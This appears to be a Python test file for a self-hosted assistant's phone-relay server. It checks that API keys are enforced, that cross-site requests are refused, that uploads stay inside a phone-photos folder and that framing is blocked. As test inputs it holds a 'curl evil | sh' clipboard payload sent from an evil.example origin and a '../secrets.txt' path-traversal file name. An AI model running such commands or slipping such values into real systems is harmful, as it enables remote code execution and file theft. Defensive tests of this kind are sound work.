"""The phone relay (/api/phone/*) needs the API key on every endpoint.  Before, status, pending and result let a client
without a key and without an Origin header through (after _authorized() had already sent its 401), so anyone on the
LAN could fake the phone's heartbeat, take Ray's pending phone tool calls, or post fake results.

Run from the repo root: python -m unittest serve.test_phone_bridge_auth
"""
import json
import sys
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import serve.server as server  # noqa: E402
from serve.frontend import ChatTemplate  # noqa: E402
from serve.server import ByteTokenizer, MockEngine, Service, serve  # noqa: E402

ROOT = Path(__file__).resolve().parents[1]
KEY = "phone-test-key"  # scan-secrets: fake-fixtures


class PhoneRelayNeedsTheKey(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        tok = ByteTokenizer()
        cls.svc = Service(MockEngine(tok, "ok", max_context=4096), tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
        cls.svc.api_key = KEY
        cls.httpd = serve(cls.svc, port=0)
        cls.base = f"http://127.0.0.1:{cls.httpd.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def setUp(self):
        server.PHONE_BRIDGE = server.PhoneBridge()           # a fresh relay for each test

    def call(self, method, path, body=None, key=None):
        headers = {"Content-Type": "application/json"}
        if key:
            headers["Authorization"] = f"Bearer {key}"
        req = urllib.request.Request(self.base + path, method=method, headers=headers,
                                     data=json.dumps(body).encode() if body is not None else None)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, json.loads(r.read() or b"{}")
        except urllib.error.HTTPError as e:
            with e:
                return e.code, {}

    def upload(self, name, key=None):
        headers = {"Content-Type": "application/octet-stream"}
        if key:
            headers["Authorization"] = f"Bearer {key}"
        req = urllib.request.Request(f"{self.base}{server.PHONE_UPLOAD_PATH}?file={urllib.parse.quote(name)}",
                                     method="POST", headers=headers, data=b"jpeg")
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, json.loads(r.read() or b"{}")
        except urllib.error.HTTPError as e:
            with e:
                return e.code, {}

    def test_no_key_no_heartbeat(self):
        for method, path in (("GET", "/api/phone/status"), ("POST", "/api/phone/status"),
                             ("GET", "/api/phone/tool/pending")):
            with self.subTest(path=f"{method} {path}"):
                status, _ = self.call(method, path, {} if method == "POST" else None)
                self.assertEqual(status, 401)
        self.assertFalse(server.PHONE_BRIDGE.get_status()["connected"])

    def test_no_key_cannot_take_a_pending_call_or_answer_it(self):
        bridge = server.PHONE_BRIDGE
        bridge.report_heartbeat()
        with bridge.lock:
            bridge.pending_calls["c1"] = {"id": "c1", "tool": "phone_get_2fa_code", "args": {}, "created": 9e12,
                                          "event": __import__("threading").Event(), "result": None, "dispatched": False}
        self.assertEqual(self.call("GET", "/api/phone/tool/pending")[0], 401)
        self.assertFalse(bridge.pending_calls["c1"]["dispatched"])        # still waiting for the real phone
        self.assertEqual(self.call("POST", "/api/phone/tool/result", {"id": "c1", "result": "fake"})[0], 401)
        self.assertIsNone(bridge.pending_calls["c1"]["result"])

    def test_with_the_key_the_phone_works(self):
        self.assertEqual(self.call("POST", "/api/phone/status", {}, key=KEY)[0], 200)
        status, body = self.call("GET", "/api/phone/status", key=KEY)
        self.assertEqual(status, 200)
        self.assertTrue(body["connected"])
        status, body = self.call("GET", "/api/phone/tool/pending", key=KEY)
        self.assertEqual((status, body.get("pending")), (200, None))

    # the app's own paths: /v1/* is what passes Cloudflare Access with only the key (the voice drawer, phone locked)
    def test_the_apps_paths_need_the_key(self):
        self.assertEqual(self.call("GET", server.PHONE_PENDING_PATH)[0], 401)
        self.assertEqual(self.call("POST", server.PHONE_RESULT_PATH, {"id": "c1", "result": "fake"})[0], 401)
        self.assertFalse(server.PHONE_BRIDGE.get_status()["connected"])

    def test_the_apps_paths_carry_a_tool_call(self):
        bridge = server.PHONE_BRIDGE
        self.assertEqual(self.call("GET", server.PHONE_PENDING_PATH, key=KEY)[0], 200)     # the heartbeat
        self.assertTrue(bridge.get_status()["connected"])
        answers = []
        caller = threading.Thread(target=lambda: answers.append(bridge.enqueue_call("phone_get_battery", {}, 5.0)))
        caller.start()
        call = None
        for _ in range(100):
            call = self.call("GET", server.PHONE_PENDING_PATH, key=KEY)[1].get("pending")
            if call:
                break
            time.sleep(0.01)
        self.assertEqual(call["tool"], "phone_get_battery")
        self.assertEqual(self.call("POST", server.PHONE_RESULT_PATH, {"id": call["id"], "result": "Battery: 86%"},
                                   key=KEY)[0], 200)
        caller.join(5)
        self.assertEqual(answers, ["Battery: 86%"])

    def test_a_slow_tool_outlives_the_other_pollers(self):
        # the drawer's relay runs a photo for over 10 s while the web page keeps polling: its result still counts
        bridge = server.PHONE_BRIDGE
        with bridge.lock:
            bridge.pending_calls["c1"] = {"id": "c1", "tool": "phone_camera_snap", "args": {},
                                          "created": time.time() - 11, "event": threading.Event(), "result": None,
                                          "dispatched": True}
        self.assertIsNone(bridge.pop_pending_call())
        self.assertIn("c1", bridge.pending_calls)

    def test_a_call_nobody_took_still_expires(self):
        bridge = server.PHONE_BRIDGE
        with bridge.lock:
            bridge.pending_calls["c1"] = {"id": "c1", "tool": "phone_get_battery", "args": {},
                                          "created": time.time() - 11, "event": threading.Event(), "result": None,
                                          "dispatched": False}
        self.assertIsNone(bridge.pop_pending_call())
        self.assertNotIn("c1", bridge.pending_calls)

    def test_the_apps_upload_only_takes_phone_photos(self):
        for name, want in (("phone-photos/RAY_SNAP_1.jpg", True), ("phone-photos/a/b.jpg", True),
                           ("phone-photos/../secrets.txt", False), ("notes.txt", False), ("phone-photos", False),
                           ("", False), ("/phone-photos/a.jpg", False)):
            with self.subTest(name=name):
                self.assertEqual(server.is_phone_photo(name), want)
        status, _ = self.upload("notes.txt", key=KEY)
        self.assertEqual(status, 403)
        status, _ = self.upload("phone-photos/x.jpg")
        self.assertEqual(status, 401)


class PageRefusesFrames(PhoneRelayNeedsTheKey):
    """The app's page embeds no frames and may not be framed: the Android bridge is injected into every frame."""

    def test_html_pages_forbid_frames(self):
        with urllib.request.urlopen(self.base + "/", timeout=10) as r:
            csp = r.headers.get("Content-Security-Policy", "")
            self.assertIn("frame-src 'none'", csp)
            self.assertIn("frame-ancestors 'self'", csp)
            self.assertEqual(r.headers.get("X-Frame-Options"), "SAMEORIGIN")



class PhoneRelayRefusesAForeignPage(unittest.TestCase):
    """Without an api_key (the default on 127.0.0.1), a page on any site could send a "simple" cross-site text/plain
    POST to /api/phone/clipboard and set the desktop clipboard, or fake the phone's heartbeat and results."""

    @classmethod
    def setUpClass(cls):
        tok = ByteTokenizer()
        cls.svc = Service(MockEngine(tok, "ok", max_context=4096), tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
        cls.httpd = serve(cls.svc, port=0)
        cls.host = f"127.0.0.1:{cls.httpd.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def setUp(self):
        self.saved_bridge = server.PHONE_BRIDGE
        server.PHONE_BRIDGE = server.PhoneBridge()
        self.addCleanup(setattr, server, "PHONE_BRIDGE", self.saved_bridge)

    def post(self, path, body, origin=None, ctype="text/plain;charset=UTF-8"):
        headers = {"Content-Type": ctype}
        if origin:
            headers["Origin"] = origin
        req = urllib.request.Request(f"http://{self.host}{path}", method="POST", headers=headers,
                                     data=json.dumps(body).encode())
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status
        except urllib.error.HTTPError as e:
            with e:
                return e.code

    def test_a_foreign_page_cannot_set_the_clipboard_or_fake_the_phone(self):
        from unittest import mock
        with mock.patch.object(server.subprocess, "run") as run:
            for path, body in (("/api/phone/clipboard", {"text": "curl evil | sh"}), ("/api/phone/status", {}),
                               (server.PHONE_CLIPBOARD_PATH, {"text": "curl evil | sh"})):
                with self.subTest(path=path):
                    self.assertEqual(self.post(path, body, origin="https://evil.example"), 403)
            time.sleep(0.2)
            run.assert_not_called()
        self.assertFalse(server.PHONE_BRIDGE.get_status()["connected"])
        self.assertEqual(server.PHONE_BRIDGE.clipboard["text"], "")

    def test_the_own_page_and_the_app_still_work(self):
        from unittest import mock
        with mock.patch.object(server.subprocess, "run"):
            self.assertEqual(self.post("/api/phone/status", {}, origin=f"http://{self.host}"), 200)
            self.assertEqual(self.post(server.PHONE_CLIPBOARD_PATH, {"text": "hi", "updated_ms": "soon"},
                                       ctype="application/json"), 200)        # the Android app: no Origin
            self.assertEqual(self.post(server.PHONE_CLIPBOARD_PATH, {"text": "hi", "updated_ms": float("nan")},
                                       ctype="application/json"), 200)        # NaN: int() raised, no answer
            time.sleep(0.3)             # the Klipper sync thread runs inside the patch, never on the real clipboard
        self.assertEqual(server.PHONE_BRIDGE.clipboard["text"], "hi")


class RayRoutesFromAnotherSite(unittest.TestCase):
    """With cors_origins ["*"] (both live configs) any site could read /v1/ray/* GETs - the phone's clipboard, its
    pending calls, the LAN proof - and a no-cors GET of /api/phone/tool/pending popped a call."""

    @classmethod
    def setUpClass(cls):
        tok = ByteTokenizer()
        cls.svc = Service(MockEngine(tok, "ok", max_context=4096), tok, ChatTemplate(ROOT / "serve/chat_template.jinja"))
        cls.svc.cors_origins = ["*"]
        cls.httpd = serve(cls.svc, port=0)
        cls.base = f"http://127.0.0.1:{cls.httpd.server_address[1]}"

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def setUp(self):
        self.saved = server.PHONE_BRIDGE
        server.PHONE_BRIDGE = server.PhoneBridge()

    def tearDown(self):
        server.PHONE_BRIDGE = self.saved

    def get(self, path, **headers):
        req = urllib.request.Request(self.base + path, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=10) as r:
                return r.status, dict(r.headers)
        except urllib.error.HTTPError as e:
            with e:
                return e.code, dict(e.headers)

    def test_another_site_gets_nothing(self):
        from unittest import mock
        with mock.patch.object(server.subprocess, "run") as run:
            for path in (server.PHONE_CLIPBOARD_PATH, server.PHONE_PENDING_PATH, "/api/phone/tool/pending"):
                for hdr in ({"Origin": "https://evil.example"}, {"Sec-Fetch-Site": "cross-site"}):
                    with self.subTest(path=path, hdr=hdr):
                        self.assertEqual(self.get(path, **hdr)[0], 403)
            run.assert_not_called()                          # the desktop clipboard was not even queried
        self.assertFalse(server.PHONE_BRIDGE.get_status()["connected"])

    def test_no_cors_header_on_ray_routes_the_api_keeps_it(self):
        _, h = self.get("/v1/ray/history?session=x", **{"Sec-Fetch-Site": "same-origin"})
        self.assertNotIn("Access-Control-Allow-Origin", h)
        _, h = self.get("/v1/models", Origin="https://app.example")
        self.assertEqual(h.get("Access-Control-Allow-Origin"), "*")

    def test_the_proof_is_never_given_to_a_browser(self):
        for hdr in ({"Origin": "http://192.168.1.2:8080"}, {"Sec-Fetch-Mode": "cors"}):
            with self.subTest(hdr=hdr):
                self.assertEqual(server.ray_lan_proof("k", "0" * 32, "192.168.1.20", hdr)[0], 403)


if __name__ == "__main__":
    unittest.main()
